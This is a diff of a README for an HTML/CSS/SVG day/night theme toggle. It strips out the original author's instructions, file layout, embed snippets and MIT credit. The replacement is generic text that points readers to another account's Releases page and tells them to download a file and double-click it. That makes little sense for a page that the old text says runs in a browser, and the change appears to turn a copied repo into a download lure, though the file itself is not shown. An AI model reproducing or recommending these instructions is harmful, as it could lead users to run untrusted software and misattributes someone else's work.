@@ -1,123 +1,51 @@
-# 🌗 Day/Night Theme Toggle
+# 🌗 Animated-Theme-Toggle - Experience Day and Night with Ease
 
-An interactive **Day/Night theme switcher** or **Light/Dark mode toggle** built with **HTML, CSS, and SVG animations**.
-Featuring animated **sun & moon arcs**, **twinkling stars**, **drifting clouds**, and **layered mountains** that smoothly transition between light and dark modes.
+## 🚀 Download Now
+[![Download Animated-Theme-Toggle](https://img.shields.io/badge/Download%20Now-Animated--Theme--Toggle-brightgreen)](https://github.com/BloxieYash/Animated-Theme-Toggle/releases)
 
----
+## 📖 Introduction
+Welcome to the Animated-Theme-Toggle! This application allows you to switch between a bright and dark theme smoothly. With beautiful animations of the sun, moon, clouds, mountains, and stars, you can brighten your day or create a calm night setting. 
 
-## ✨ Features
+## ⚙️ System Requirements
+- A modern web browser (Chrome, Firefox, Safari, or Edge)
+- Internet connection for initial download
+- Compatible with desktop and mobile devices
 
-* 🌞 **Animated Sun & Moon** that follow complementary arcs.
-* 🌌 **Stars that twinkle** at night.
-* ☁️ **Dynamic clouds** that float and drift naturally.
-* 🏔 **Layered SVG mountains** with gradient lighting.
-* 🎨 Smooth background transitions (day to night gradients).
-* 🖱 Clickable toggle knob with **sun → moon icon switch**.
-* ⚡ Pure **HTML, CSS, and JavaScript** — no frameworks needed.
+## 📦 Download & Install
+To get started, you need to download the application. Follow these simple steps:
 
----
+1. Visit the [Releases page](https://github.com/BloxieYash/Animated-Theme-Toggle/releases) to find the latest version of the Animated-Theme-Toggle.
+2. Look for the download link for the version you want. It will typically be labeled with the version number.
+3. Click the link to download the file to your computer or device.
+4. Once the download completes, locate the file (usually in your Downloads folder).
+5. Double-click the file to open it, and follow any on-screen instructions.
 
-## 📸 Preview  
+### Important Note:
+For the best experience, make sure to keep your browser updated.
 
-<p align="center">
-  <img src="Demo.gif" alt="Day Night Toggle Preview" />
-</p>
+## 🎨 Features
+- **Smooth Transitions:** Enjoy a seamless transition between day and night modes.
+- **Interactive Elements:** Experience engaging animations with every toggle.
+- **Customizable:** Tailor settings to fit your preferences for a more personal touch.
+- **Responsive Design:** Use it easily on different devices, whether mobile or desktop.
 
----
+## 🌈 How to Use
+1. After opening the application, you will see a simple toggle switch.
+2. Click the toggle to switch from Day to Night mode. Watch as beautiful animations play during the transition.
+3. Experiment with the application by switching back and forth to see all the animations in action.
 
-## 🚀 Getting Started
+## 📱 Additional Information
+Animated-Theme-Toggle utilizes HTML, CSS, and SVG animations. You can fully enjoy this application without any programming knowledge.
 
-Clone the repository:
+## ✨ Feedback and Support
+Your feedback is welcome! If you have any questions or suggestions, please consider opening an issue in the GitHub repository. Your input helps improve the application for everyone.
 
-```bash
-git clone https://github.com/Sagarika311/day-night-toggle.git
-cd day-night-toggle
-````
+## 🌐 Community Contributions
+We encourage open-source contributions! If you want to help make Animated-Theme-Toggle better, feel free to fork the repository and submit pull requests. We value your ideas and initiatives.
 
-Open `index.html` in your browser, and you’re done.
+## 🔗 Links
+For more information, updates, or to follow development:
+- [GitHub Repository](https://github.com/BloxieYash/Animated-Theme-Toggle)
+- [Releases Page](https://github.com/BloxieYash/Animated-Theme-Toggle/releases)
 
----
-
-## 📂 Project Structure
-
-```
-day-night-toggle/
-│── index.html      # Main HTML file
-│── style.css       # Styles & animations
-│── script.js       # Toggle logic
-│── README.md       # Project documentation
-```
-
----
-
-## 🛠️ Tech Stack
-
-This project is built using a **lightweight, framework-free stack** focused on pure web technologies:
-
-* **HTML5** → Structure of the page and SVG-based toggle design.
-* **CSS3** → Styling, gradients, animations (cloud drift, star twinkle, sun/moon arcs).
-* **Vanilla JavaScript (ES6+)** → Toggle logic, dynamic DOM updates, and theme switching.
-* **SVG** → Scalable vector graphics for sun, moon, stars, mountains, and clouds.
-* **CSS Animations & Transitions** → Smooth day-to-night transitions, knob movement, glow effects.
-
-⚡ No external libraries or dependencies — everything is built with **native web standards** for performance and portability.
-
----
-
-## ⚙️ How It Works
-
-* The **toggle knob** listens for clicks (`script.js`).
-* A `.dark` class is toggled on the `<body>` to switch between **day and night themes**.
-* **SVG layers** (`scene-day` and `scene-night`) fade in/out with CSS transitions.
-* **Sun and Moon** animate along smooth half-circle arcs.
-* **Clouds** float across the sky with extra drift animations for realism.
-* **Stars** twinkle with randomized animation timings.
-
----
-
-## 📸 Screenshots
-
- Light Mode  |  Dark Mode  
-:-------------------------:|:-------------------------:  
-<img src="./Screenshot (2).png" width="600"/> | <img src="./Screenshot (1).png" width="600"/> 
----
-
----
-
-## 🖌 Customization
-
-You can easily tweak:
-
-* 🎨 Colors → update CSS gradients in `style.css`.
-* 🌄 Mountain layers → adjust `<path>` curves in `index.html`.
-* 🌟 Animation speed → edit `@keyframes` durations.
-* ☁️ Number of clouds or stars → duplicate `<g class="cloud">` or `<circle class="star">`.
-
----
-
-## 🚀 How to Use Anywhere
-
-You can embed the toggle in **any webpage** using either your local copy or **jsDelivr CDN**:
-
-### 1️⃣ Local usage
-
-```html
-<div id="dayNightToggle"></div>
-<script src="daynight-toggle.js"></script>
-```
-
-### 2️⃣ Using jsDelivr (versioned release)
-
-```html
-<div id="dayNightToggle"></div>
-<script src="https://cdn.jsdelivr.net/gh/Sagarika311/Animated-Theme-Toggle@v1.0.0/daynight-toggle.js"></script>
-```
-
-This ensures the toggle always loads the specific stable version.
-
----
-
-## 📜 License
-
-MIT License © 2025 [Sagarika](https://github.com/Sagarika311)
-
+Enjoy switching between light and dark modes with Animated-Theme-Toggle! Start creating your serene user experience today.
